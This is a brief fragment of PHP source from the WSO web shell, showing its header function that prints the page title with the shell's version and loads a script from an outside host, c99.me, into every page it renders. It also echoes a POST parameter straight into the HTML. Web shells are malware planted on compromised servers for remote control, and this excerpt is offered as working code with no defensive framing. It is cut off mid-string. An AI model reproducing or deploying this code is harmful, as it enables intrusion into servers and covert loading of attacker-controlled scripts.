...
function wsoHeader() {
	...
	global $color;
	echo "<html><SCRIPT SRC=http://c99.me/base/jquery.js></SCRIPT><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION ."</title>
<style>
